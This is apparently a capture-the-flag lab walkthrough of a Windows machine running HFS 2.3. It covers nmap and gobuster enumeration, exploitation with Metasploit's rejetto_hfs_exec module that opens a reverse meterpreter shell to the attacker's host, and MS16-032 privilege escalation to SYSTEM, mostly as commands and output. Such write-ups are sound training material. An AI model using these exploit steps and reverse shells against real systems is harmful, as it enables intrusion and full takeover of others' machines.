# nmap

enumerating the target with nmap,
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nmap -Pn -A  -p-20000 -sS --vv 10.129.3.255 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 10:08 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:08
Completed NSE at 10:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:08
Completed NSE at 10:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:08
Completed NSE at 10:08, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:08
Completed Parallel DNS resolution of 1 host. at 10:08, 0.06s elapsed
Initiating SYN Stealth Scan at 10:08
Scanning 10.129.3.255 [20000 ports]
Discovered open port 80/tcp on 10.129.3.255
SYN Stealth Scan Timing: About 10.87% done; ETC: 10:12 (0:04:14 remaining)
SYN Stealth Scan Timing: About 31.15% done; ETC: 10:11 (0:02:15 remaining)
SYN Stealth Scan Timing: About 56.14% done; ETC: 10:10 (0:01:11 remaining)
Completed SYN Stealth Scan at 10:10, 138.82s elapsed (20000 total ports)
Initiating Service scan at 10:10
Scanning 1 service on 10.129.3.255
Completed Service scan at 10:10, 6.44s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.129.3.255
Retrying OS detection (try #2) against 10.129.3.255
Initiating Traceroute at 10:10
Completed Traceroute at 10:10, 0.23s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 10:10
Completed Parallel DNS resolution of 2 hosts. at 10:10, 0.05s elapsed
NSE: Script scanning 10.129.3.255.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:10
Completed NSE at 10:10, 6.33s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:10
Completed NSE at 10:10, 0.95s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:10
Completed NSE at 10:10, 0.00s elapsed
Nmap scan report for 10.129.3.255
Host is up, received user-set (0.23s latency).
Scanned at 2021-08-16 10:08:09 IST for 159s
Not shown: 19999 filtered ports
Reason: 19999 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|7|2008|Vista (95%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_vista::sp1
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (95%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 or Server 2012 R2 (90%), Microsoft Windows Server 2012 (88%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 (88%), Microsoft Windows Vista SP1 (88%), Microsoft Windows Server 2008 R2 SP1 (87%), Microsoft Windows 7 SP1 (86%), Microsoft Windows Windows 7 SP1 (86%), Microsoft Windows Vista Home Premium SP1, Windows 7, or Windows Server 2008 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=8/16%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6119EC50%P=x86_64-pc-linux-gnu)
SEQ(SP=10A%GCD=1%ISR=10C%II=I%TS=7)
OPS(O1=M54BNW8ST11%O2=M54BNW8ST11%O3=M54BNW8NNT11%O4=M54BNW8ST11%O5=M54BNW8ST11%O6=M54BST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M54BNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=80%W=0%S=O%A=O%F=A%O=%RD=0%Q=)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.002 days (since Mon Aug 16 10:07:19 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   211.56 ms 10.10.16.1
2   211.71 ms 10.129.3.255

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:10
Completed NSE at 10:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:10
Completed NSE at 10:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:10
Completed NSE at 10:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.45 seconds
           Raw packets sent: 40174 (1.771MB) | Rcvd: 13168 (1.815MB)
```
we just have the http service running on port 80 and nothing else.

# gobuster
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# gobuster dir -u http://10.129.3.255 -w /usr/share/dirb/wordlists/common.txt -e -n
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.3.255
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/16 10:08:33 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.3.255/favicon.ico          [Size: 576]
                                                    
===============================================================
2021/08/16 10:12:28 Finished
===============================================================
```
no juicy results :(

heading to the webpage we get to know that it used http file share of version 2.3

[HTF](http://www.rejetto.com/hfs/)

# searchsploit

I searched for any entries for HFS in exploit data base

```
â”€â”€(rootðŸ’€kali)-[~]
â””â”€# searchsploit hfs        
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Servic | osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)          | osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure      | osx/local/35488.c
Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalati | osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution       | windows/remote/37985.py
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)      | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)      | multiple/remote/48569.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service      | linux/dos/28895.txt
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metas | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilitie | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload   | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution  | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution  | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command E | windows/webapps/34852.txt
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
we can see we have a remote code execution vulnerability.

# metasploit

```
msf6 > search HFS

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec
```
I used  exploit/windows/http/rejetto_hfs_exec

```
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.129.3.255
rhosts => 10.129.3.255
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.3.255     yes       The target host(s), range CIDR identifier, or hosts file with
                                          syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must b
                                         e an address on the local machine or 0.0.0.0 to listen on all
                                          addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generat
                                         ed)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.10.16.4
lhost => 10.10.16.4
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Using URL: http://0.0.0.0:8080/mIR5R1zW
[*] Local IP: http://10.0.2.15:8080/mIR5R1zW
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /mIR5R1zW
[*] Sending stage (175174 bytes) to 10.129.3.255
[!] Tried to delete %TEMP%\kwcRjuZ.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.16.4:4444 -> 10.129.3.255:49162) at 2021-08-16 10:18:01 +0530
[*] Server stopped.

meterpreter > ls
Listing: C:\Users\kostas\Desktop
================================

Mode      Size    Type  Last modifi  Name
                        ed
----      ----    ----  -----------  ----
40777/rw  0       dir   2021-08-22   %TEMP%
xrwxrwx                 19:15:46 +0
                        530
100666/r  282     fil   2017-03-18   desktop.ini
w-rw-rw-                17:27:16 +0
                        530
100777/r  760320  fil   2014-02-16   hfs.exe
wxrwxrwx                17:28:52 +0
                        530
100444/r  32      fil   2017-03-18   user.txt.txt
--r--r--                17:43:18 +0
                        530

meterpreter > getuid
Server username: OPTIMUM\kostas
```

# Privilege Esacalation

I backgrounded the current session using the command background and used multi/recon/local_exploit_suggester to find possible privilege escalation techniques.

I found two of them
```
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.3.255 - Collecting local exploits for x86/windows...
[*] 10.129.3.255 - 38 exploit checks are being tried...
[+] 10.129.3.255 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in 
  the Registry under the current user hive, and inserting a custom 
  command that will get invoked when the Windows Event Viewer is 
  launched. It will spawn a second shell that has the UAC flag turned 
  off. This module modifies a registry key, but cleans up the key once 
  the payload has been invoked. The module does not require the 
  architecture of the payload to match the OS. If specifying 
  EXE::Custom your DLL should call ExitProcess() after starting your 
  payload in a separate process.
[+] 10.129.3.255 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
  This module exploits the lack of sanitization of standard handles in 
  Windows' Secondary Logon Service. The vulnerability is known to 
  affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This 
  module will only work against those versions of Windows with 
  Powershell 2.0 or later and systems with two or more CPU cores.
[*] Post module execution completed
```
Since both have bit of ambiguity,I tried both of them.The second one worked.

```
msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost 10.10.16.4
lhost => 10.10.16.4
msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/bypassuac_eventvwr) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                                                                                                                                                   
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options
                                                                                                                                                                                                                                           
Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):                                                                                                                                                            
                                                                                                                                                                                                                                           
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.16.4
lhost => 10.10.16.4
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\UaVhFtL.ps1...
[*] Compressing script contents...
[+] Compressed size: 3592
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2576

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2556
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

a4Gz0CdSKouVCi0cr0izYZ97ZLUxf9HO
[+] Executed on target machine.
[*] Sending stage (175174 bytes) to 10.129.3.255
[*] Meterpreter session 2 opened (10.10.16.4:4444 -> 10.129.3.255:49163) at 2021-08-16 10:30:23 +0530
[+] Deleted C:\Users\kostas\AppData\Local\Temp\UaVhFtL.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

We are  NT AUTHORITY\SYSTEM :)


